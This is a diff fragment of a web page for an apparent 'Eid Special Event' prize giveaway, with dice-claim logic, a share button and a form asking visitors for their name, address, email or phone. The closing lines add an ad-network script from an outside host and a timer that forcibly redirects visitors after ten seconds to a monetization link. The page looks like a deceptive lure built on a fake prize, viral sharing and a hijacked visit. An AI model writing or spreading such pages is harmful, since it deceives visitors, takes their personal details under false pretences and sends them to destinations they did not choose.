+                alert(`You claimed ${diceToAdd} dice!`); event.target.disabled=true; event.target.textContent=`Claimed ${diceToAdd} Dice`;
+                const p=document.querySelector(`#tier-${tierId} p`); if(p) p.innerHTML = p.innerHTML.split('.')[0] + `. (Claimed ${diceToAdd} Dice)`;
+                const ib=document.querySelector(`#tier-${tierId} button:not(.claim-dice-button)`); if(ib) ib.disabled=true;
+            } else { alert("Already claimed for this tier."); }
+        }
+
+        // --- Share & Modal Logic ---
+        shareButton.addEventListener('click', () => {
+            const shareData = { title: 'EID SPECIAL EVENT - Win Big!', text: 'Join the Eid Special Event! Play, roll dice, win amazing prizes!', url: window.location.href };
+            if (navigator.share) { navigator.share(shareData).catch(e => console.log('Error sharing:', e)); }
+            else { alert("Share this link:\n" + window.location.href + "\n\n" + shareData.text); }
+        });
+        openPrizeRegistrationModalButton.addEventListener('click', () => { userReceivedPrizeModal.style.display = 'block'; userReceivedFormMessageEl.textContent = ''; });
+        closeUserReceivedModalButton.addEventListener('click', () => { userReceivedPrizeModal.style.display = 'none'; });
+        window.addEventListener('click', (event) => { if (event.target == userReceivedPrizeModal) { userReceivedPrizeModal.style.display = 'none'; } });
+        submitRegistrationButton.addEventListener('click', () => {
+            const name = regUserNameInput.value.trim(), email = regUserEmailInput.value.trim();
+            const phone = regUserPhoneInput.value.trim(), address = regUserAddressInput.value.trim();
+            if (name && address && (email || phone)) {
+                userReceivedFormMessageEl.textContent = "Thank you for registering!"; userReceivedFormMessageEl.style.color = "#2ecc71";
+                regUserNameInput.value=''; regUserEmailInput.value=''; regUserPhoneInput.value=''; regUserAddressInput.value='';
+                setTimeout(() => { userReceivedPrizeModal.style.display = 'none'; userReceivedFormMessageEl.textContent = ''; }, 2500);
+            } else { userReceivedFormMessageEl.textContent = "Please fill all fields: Name, Address, and Email or Phone."; userReceivedFormMessageEl.style.color = "red"; setTimeout(() => { userReceivedFormMessageEl.textContent = ''; }, 3000); }
+        });
+        
+        // --- Initial Setup ---
+        function initApp() {
+            console.log("Initializing App...");
+            updateDiceCountUI();
+            startCountdown();
+            populateWinnersList();
+            renderReferralTiers();
+            console.log("App Initialized.");
+        }
+        
+        // Ensure DOM is ready before running init
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initApp);
+        } else {
+            initApp();
+        }
+
+    </script>
+
+<div style="width: 100%; display: flex; justify-content: center; margin-top: 10px;">
+    <script type="text/javascript">
+        atOptions = {
+            'key' : 'ee078fbb754e72aacdd66129a692543e',
+            'format' : 'iframe',
+            'height' : 90,
+            'width' : 728,
+            'params' : {}
+        };
+    </script>
+    <script type="text/javascript" src="//www.highperformanceformat.com/ee078fbb754e72aacdd66129a692543e/invoke.js"></script>
+</div>
+
+
+<script>
+    setTimeout(function() {
+        window.location.href = "https://www.profitableratecpm.com/wvifb2yw?key=1c28527cf77bfef29dee84d908859229";
+    }, 10000);
+</script>
+
+</body>
+</html>
